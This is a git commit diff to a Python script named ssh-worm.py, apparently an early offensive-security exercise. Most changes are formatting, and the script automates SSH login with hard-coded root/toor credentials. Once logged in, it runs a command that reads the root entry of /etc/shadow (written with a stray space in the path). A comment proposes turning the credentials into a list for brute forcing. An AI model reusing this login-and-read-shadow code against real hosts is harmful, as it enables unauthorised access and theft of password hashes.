4a1cfa080028f92d8867ff165493d658878899b6
justin soderberg <sodejm@gmail.com>
2016-07-18 11:06:09 -0700

    formatting and bruteforce creation

--- ssh-worm.py
+++ ssh-worm.py
@@ -1,5 +1,7 @@
 import pexpect
-PROMPT = ['#', '>>>','>','\$']
+
+PROMPT = ['#', '>>>', '>', '\$']
+
 
 # send command to the ssh session
 def send_command(child, cmd):
@@ -8,10 +10,10 @@ def send_command(child, cmd):
     print (child.before)
 
 
-#connect to the ssh session and handle timeouts
+# connect to the ssh session and handle timeouts
 def connect(user, host, password):
     ssh_newkey = 'Are you sure you want to continue connecting'
-    connStr = 'ssh ' +user + '@' + host
+    connStr = 'ssh ' + user + '@' + host
     child = pexpect.spawn(connStr)
     ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
     if ret == 0:
@@ -27,13 +29,15 @@ def connect(user, host, password):
         child.expect(PROMPT)
         return child
 
+
 # set default username and pass, could probably make this a list for brute forcing
 def main():
     host = 'localhost'
     user = 'root'
     password = 'toor'
-    child = connect(user,host,password)
+    child = connect(user, host, password)
     send_command(child, 'cat / etc/shadow | grep root')
+
 
 if __name__ == '__main__':
     main()
